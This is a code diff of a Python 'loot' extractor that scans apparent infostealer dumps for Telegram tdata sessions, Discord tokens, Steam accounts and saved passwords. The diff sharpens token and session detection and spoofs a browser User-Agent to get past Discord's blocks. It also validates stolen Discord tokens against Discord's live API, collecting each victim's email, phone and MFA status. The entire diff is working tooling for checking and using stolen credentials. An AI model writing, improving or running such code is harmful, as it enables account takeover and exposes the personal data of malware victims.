@@ -17,12 +17,13 @@ filesystem walks and never touch the network.
 from __future__ import annotations
 
 import asyncio
+import base64
 import json
 import os
 import re
 import urllib.parse
 from dataclasses import dataclass, field
-from typing import Dict, Iterable, List, Optional, Tuple
+from typing import Any, Dict, Iterable, List, Optional, Tuple
 
 from loguru import logger
 
@@ -247,7 +248,13 @@ def _walk_files(root: str) -> Iterable[Tuple[str, str]]:
 
 def _looks_like_tdata(path: str) -> Optional[TdataAccount]:
     """If *path* (a directory) looks like a Telegram Desktop ``tdata``
-    folder return a partially-populated :class:`TdataAccount`."""
+    folder return a partially-populated :class:`TdataAccount`.
+
+    To avoid bundling random unrelated ``Telegram`` folders (e.g. the
+    Documents/Photos cache) we require **both** the ``key_datas`` file
+    *and* a 16-hex keyfile sibling. A bare ``key_datas`` alone or a
+    bare keyfile alone is rejected.
+    """
     try:
         entries = os.listdir(path)
     except OSError:
@@ -266,18 +273,20 @@ def _looks_like_tdata(path: str) -> Optional[TdataAccount]:
             os.path.join(path, name)
         ):
             keyfolder = name
-    if not (has_key_datas or keyfile):
+    # Strict: a real tdata folder always carries both pieces. Folders
+    # with only one are almost always false positives (e.g. random
+    # ``Telegram`` doc caches in stealer dumps).
+    if not (has_key_datas and keyfile):
         return None
     acc = TdataAccount(root=path, keyfile=keyfile)
-    if has_key_datas:
-        key_path = os.path.join(path, "key_datas")
-        try:
-            with open(key_path, "rb") as fh:
-                head = fh.read(4)
-            acc.key_datas_size = os.path.getsize(key_path)
-            acc.has_tdf_magic = head == _TDATA_MAGIC
-        except OSError:
-            pass
+    key_path = os.path.join(path, "key_datas")
+    try:
+        with open(key_path, "rb") as fh:
+            head = fh.read(4)
+        acc.key_datas_size = os.path.getsize(key_path)
+        acc.has_tdf_magic = head == _TDATA_MAGIC
+    except OSError:
+        pass
     if keyfolder:
         maps_path = os.path.join(path, keyfolder, "maps")
         acc.has_maps = os.path.isfile(maps_path)
@@ -405,8 +414,40 @@ _DISCORD_PATH_HINT = re.compile(
 )
 
 
+def _discord_user_id_from_token(token: str) -> str:
+    """Decode the leading segment of a classic Discord token and return
+    the embedded snowflake user ID (or ``""`` if the prefix is not a
+    valid base64 → decimal snowflake)."""
+    if not token or "." not in token:
+        return ""
+    head = token.split(".", 1)[0]
+    if not head:
+        return ""
+    # Discord uses urlsafe base64 with the padding stripped. Re-pad and
+    # decode; reject anything that doesn't come out to an ASCII decimal
+    # snowflake of plausible length.
+    padded = head + "=" * (-len(head) % 4)
+    try:
+        decoded = base64.urlsafe_b64decode(padded.encode("ascii"))
+        text = decoded.decode("ascii", errors="strict")
+    except Exception:
+        return ""
+    if not text.isdigit():
+        return ""
+    if not (15 <= len(text) <= 22):
+        return ""
+    return text
+
+
 def _extract_tokens_from_bytes(blob: bytes) -> List[str]:
-    """Return every Discord token literal contained in *blob*."""
+    """Return every Discord token literal contained in *blob*.
+
+    The regex match is intentionally loose so we can catch tokens
+    surrounded by binary junk in LevelDB blobs; we then verify the
+    leading segment decodes to a valid Discord snowflake user-ID,
+    which kills almost all of the false positives that come from
+    random base64-like noise.
+    """
     tokens: List[str] = []
     for m in _DISCORD_TOKEN_RE.finditer(blob):
         try:
@@ -414,8 +455,13 @@ def _extract_tokens_from_bytes(blob: bytes) -> List[str]:
         except UnicodeDecodeError:
             continue
         tok = _DISCORD_STRIP_RE.sub("", tok)
-        if tok:
-            tokens.append(tok)
+        if not tok:
+            continue
+        # The ``mfa.<long>`` variant doesn't carry a user-ID prefix;
+        # only the classic 3-segment tokens do.
+        if not tok.startswith("mfa.") and not _discord_user_id_from_token(tok):
+            continue
+        tokens.append(tok)
     return tokens
 
 
@@ -459,6 +505,20 @@ def scan_discord_tokens(root: str) -> List[DiscordToken]:
     output is deduplicated by token string.
     """
     seen: Dict[str, DiscordToken] = {}
+
+    def _accept(token: str) -> bool:
+        """Final per-token sanity check: classic tokens must decode to
+        a valid snowflake user-ID; ``mfa.*`` tokens pass through.
+
+        Stops random base64-shaped strings (e.g. cryptographic nonces,
+        CSRF tokens) from being reported as Discord auth tokens.
+        """
+        if not token:
+            return False
+        if token.startswith("mfa."):
+            return len(token) >= 88
+        return bool(_discord_user_id_from_token(token))
+
     for dirpath, name in _walk_files(root):
         path = os.path.join(dirpath, name)
         rel = os.path.relpath(path, root)
@@ -468,13 +528,19 @@ def scan_discord_tokens(root: str) -> List[DiscordToken]:
                 # Plain-text dumps usually carry one token per line.
                 token = line.strip().strip('"').strip("'")
                 token = token.split()[0] if token.split() else ""
-                if token and _DISCORD_TOKEN_RE.match(token.encode()):
+                if (
+                    token
+                    and _DISCORD_TOKEN_RE.match(token.encode())
+                    and _accept(token)
+                ):
                     if token not in seen:
                         seen[token] = DiscordToken(
                             token=token, source_file=rel,
                         )
         elif _DISCORD_LDB_RE.search(name) or _DISCORD_PATH_HINT.search(rel):
             for tok in _extract_tokens_from_file(path):
+                if not _accept(tok):
+                    continue
                 if tok not in seen:
                     seen[tok] = DiscordToken(token=tok, source_file=rel)
     return list(seen.values())
@@ -768,6 +834,7 @@ def scan_passwords(root: str) -> List[CredentialEntry]:
 def scan_directory_for_loot(
     root: str,
     buckets: "frozenset[str] | None" = None,
+    progress: Any = None,
 ) -> LootResult:
     """Run every (or selected) loot scanner over *root* and return the
     aggregated result.
@@ -776,33 +843,62 @@ def scan_directory_for_loot(
     ``{"loot_tdata", "loot_discord"}``).  When ``None`` or empty **all**
     scanners run.  Pass specific bucket constants from
     ``services.loot_extractor`` to limit the scan.
+
+    When *progress* is provided it must expose the fields defined on
+    :class:`services.extractor.ExtractionProgress` (``loot_bucket`` +
+    ``loot_counts``); the scanner updates those fields between buckets
+    so the dashboard can show live progress per scanner.
     """
     run_all = not buckets
     result = LootResult()
+
+    def _set_bucket(name: str) -> None:
+        if progress is not None:
+            try:
+                progress.loot_bucket = name
+            except Exception:
+                pass
+
+    def _record_count(name: str, value: int) -> None:
+        if progress is not None:
+            try:
+                progress.loot_counts[name] = value
+            except Exception:
+                pass
+
     if run_all or "loot_tdata" in buckets:
+        _set_bucket("tdata")
         try:
             result.tdata = scan_tdata(root)
+            _record_count("tdata", len(result.tdata))
         except Exception as exc:
             logger.exception("scan_tdata failed")
             result.errors.append(f"tdata scan failed: {exc}")
     if run_all or "loot_discord" in buckets:
+        _set_bucket("discord")
         try:
             result.discord = scan_discord_tokens(root)
+            _record_count("discord", len(result.discord))
         except Exception as exc:
             logger.exception("scan_discord_tokens failed")
             result.errors.append(f"discord scan failed: {exc}")
     if run_all or "loot_steam" in buckets:
+        _set_bucket("steam")
         try:
             result.steam = scan_steam(root)
+            _record_count("steam", len(result.steam))
         except Exception as exc:
             logger.exception("scan_steam failed")
             result.errors.append(f"steam scan failed: {exc}")
     if run_all or "loot_passwords" in buckets:
+        _set_bucket("passwords")
         try:
             result.credentials = scan_passwords(root)
+            _record_count("passwords", len(result.credentials))
         except Exception as exc:
             logger.exception("scan_passwords failed")
             result.errors.append(f"password scan failed: {exc}")
+    _set_bucket("")
     return result
 
 
@@ -812,41 +908,80 @@ def scan_directory_for_loot(
 
 
 async def _validate_discord_token(session, token: DiscordToken) -> None:
-    """Hit Discord's ``/users/@me`` with the recovered token. Updates
-    *token* in place with the live user fields."""
-    try:
-        async with session.get(
-            "https://discord.com/api/v9/users/@me",
-            headers={"Authorization": token.token},
-            timeout=10,
-        ) as resp:
-            if resp.status == 200:
-                data = await resp.json()
-                token.valid = True
-                token.user_id = str(data.get("id", "") or "")
-                token.username = data.get("username", "") or ""
-                token.global_name = data.get("global_name", "") or ""
-                token.email = data.get("email", "") or ""
-                token.phone = data.get("phone", "") or ""
-                token.mfa_enabled = bool(data.get("mfa_enabled", False))
-                token.verified = bool(data.get("verified", False))
-                token.locale = data.get("locale", "") or ""
-                # premium_type: 0=none, 1=classic, 2=full, 3=basic
-                pt = data.get("premium_type")
-                token.nitro = {
-                    0: "none", 1: "classic", 2: "nitro", 3: "basic",
-                }.get(pt, "")
+    """Hit Discord's ``/users/@me`` with the recovered token.
+
+    Updates *token* in place. Distinguishes truly-dead tokens (HTTP
+    401) from rate-limiting / network errors / API changes so the
+    dashboard can show ``DEAD`` only when the API actually says so.
+    Retries once on ``429 Too Many Requests`` honouring the
+    server-supplied ``retry_after`` window.
+    """
+    headers = {
+        "Authorization": token.token,
+        # Match Discord's web client UA — bare/empty UAs are blocked.
+        "User-Agent": (
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
+            "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+        ),
+        "Accept": "*/*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Origin": "https://discord.com",
+        "Referer": "https://discord.com/channels/@me",
+        "X-Discord-Locale": "en-US",
+    }
+    url = "https://discord.com/api/v9/users/@me"
+
+    for attempt in (1, 2):
+        try:
+            async with session.get(url, headers=headers, timeout=15) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    token.valid = True
+                    token.user_id = str(data.get("id", "") or "")
+                    token.username = data.get("username", "") or ""
+                    token.global_name = data.get("global_name", "") or ""
+                    token.email = data.get("email", "") or ""
+                    token.phone = data.get("phone", "") or ""
+                    token.mfa_enabled = bool(data.get("mfa_enabled", False))
+                    token.verified = bool(data.get("verified", False))
+                    token.locale = data.get("locale", "") or ""
+                    # premium_type: 0=none, 1=classic, 2=full, 3=basic
+                    pt = data.get("premium_type")
+                    token.nitro = {
+                        0: "none", 1: "classic", 2: "nitro", 3: "basic",
+                    }.get(pt, "")
+                    token.error = ""
+                    return
+                if resp.status == 401:
+                    token.valid = False
+                    token.error = "401 unauthorised (token revoked / expired)"
+                    return
+                if resp.status == 429 and attempt == 1:
+                    # Rate-limited — back off and try once more.
+                    try:
+                        body = await resp.json()
+                        delay = float(body.get("retry_after", 1.0))
+                    except Exception:
+                        delay = 1.0
+                    await asyncio.sleep(min(delay, 5.0))
+                    continue
+                if resp.status == 403:
+                    # Account locked / disabled / cloudflare block — leave
+                    # ``valid`` as unknown rather than claiming DEAD.
+                    token.valid = None
+                    token.error = "403 forbidden (locked or blocked)"
+                    return
+                token.valid = None
+                token.error = f"HTTP {resp.status}"
                 return
-            if resp.status == 401:
-                token.valid = False
-                token.error = "401 unauthorised"
-                return
-            token.valid = False
-            token.error = f"HTTP {resp.status}"
-    except asyncio.TimeoutError:
-        token.error = "timeout"
-    except Exception as exc:
-        token.error = str(exc)
+        except asyncio.TimeoutError:
+            token.valid = None
+            token.error = "timeout"
+            return
+        except Exception as exc:
+            token.valid = None
+            token.error = f"{type(exc).__name__}: {exc}"
+            return
 
 
 async def _validate_steam_account(session, acc: SteamAccount) -> None:
@@ -880,6 +1015,7 @@ async def validate_loot_async(
     validate_discord: bool = True,
     validate_steam: bool = True,
     concurrency: int = 8,
+    progress: Any = None,
 ) -> None:
     """Run the optional network-validation pass.
 
@@ -887,6 +1023,11 @@ async def validate_loot_async(
     concurrency budget to stay polite. tdata sessions are not
     network-validated here (that requires a Telegram client per
     session; structure validation has already been done).
+
+    When *progress* is passed in (an :class:`ExtractionProgress`-shaped
+    object) the dashboard fields ``loot_validate_total`` /
+    ``loot_validate_done`` are kept in sync as items complete so the
+    user sees ``Validating Discord tokens (3/12)`` live.
     """
     # Import aiohttp lazily so a user running the scanners offline
     # never pays the import cost.
@@ -896,18 +1037,33 @@ async def validate_loot_async(
         logger.warning("aiohttp missing — skipping loot validation")
         return
 
-    timeout = aiohttp.ClientTimeout(total=15)
+    timeout = aiohttp.ClientTimeout(total=20)
     sem = asyncio.Semaphore(max(1, concurrency))
+
+    # Use a real browser UA at the session level too — Discord/Steam
+    # rate-limit or outright reject the bot-shaped default UAs.
+    ua = (
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
+        "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    )
+
+    def _bump_done() -> None:
+        if progress is not None:
+            try:
+                progress.loot_validate_done += 1
+            except Exception:
+                pass
 
     async def _run(coro):
         async with sem:
-            await coro
+            try:
+                await coro
+            finally:
+                _bump_done()
 
     async with aiohttp.ClientSession(
         timeout=timeout,
-        headers={
-            "User-Agent": "Mozilla/5.0 (compatible; SaitmaLoot/1.0)",
-        },
+        headers={"User-Agent": ua},
     ) as session:
         tasks = []
         if validate_discord:
@@ -920,8 +1076,27 @@ async def validate_loot_async(
                 _run(_validate_steam_account(session, acc))
                 for acc in loot.steam
             )
+        if progress is not None:
+            try:
+                progress.loot_validate_total = len(tasks)
+                progress.loot_validate_done = 0
+            except Exception:
+                pass
         if tasks:
             await asyncio.gather(*tasks, return_exceptions=True)
+
+    # Finalise the live counts so the dashboard reads the validated
+    # totals instead of staying at the pre-validation numbers.
+    if progress is not None:
+        try:
+            progress.loot_valid_counts["discord"] = sum(
+                1 for t in loot.discord if t.valid is True
+            )
+            progress.loot_valid_counts["steam"] = sum(
+                1 for a in loot.steam if a.valid is True
+            )
+        except Exception:
+            pass
 
 
 # ════════════════════════════════════════════════════════════════════
